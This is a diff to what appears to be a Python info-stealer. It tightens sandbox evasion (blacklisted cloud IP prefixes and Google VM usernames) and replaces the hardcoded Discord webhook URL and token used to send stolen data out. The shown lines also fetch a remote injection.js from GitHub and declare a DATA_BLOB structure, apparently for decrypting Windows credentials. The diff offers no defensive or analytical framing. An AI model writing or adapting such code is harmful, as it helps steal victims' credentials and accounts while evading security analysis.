@@ -75,8 +75,9 @@ def check_ip():
     while True:
         try:
             ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
-            if ip in blacklisted:
-                exit_program('Blacklisted IP Detected')
+            if ip.startswith('34.') or ip.startswith('20.') or ip.startswith('35.') or ip.startswith('18.'):
+                if ip in blacklisted:
+                 exit_program('Blacklisted IP Detected')
             return
         except:
             pass
@@ -94,7 +95,7 @@ def check_registry():
         pass
 
 def check_windows():
-    blacklisted_usernames = {'bruno', 'george'}  # google vm users
+    blacklisted_usernames = {'Bruno', 'George'}  # google vm users
     @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
     def winEnumHandler(hwnd, ctx):
         title = ctypes.create_string_buffer(1024)
@@ -139,7 +140,7 @@ words = "https://rentry.co/5uu99/raw"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "https://discord.com/api/webhooks/1261152431446954036/CppU7uEwHS_3cCicHvjuPK5_fvi0g_cHX7JQSN_zCY0THDUZg2s_ym87bP8J4d2sVKKJ"
+h00k = "https://discord.com/api/webhooks/1261248700899004426/VXfk-69xcTph7RTSEXBDq4cMRMiLRVGzXMvGThd4ZlQvS9kbnugMYUVqybWVuXh1G2z9"
 inj3c710n_url = f"https://raw.githubusercontent.com/bGFpbg{cname}/index/main/injection.js"
 
 class DATA_BLOB(Structure):
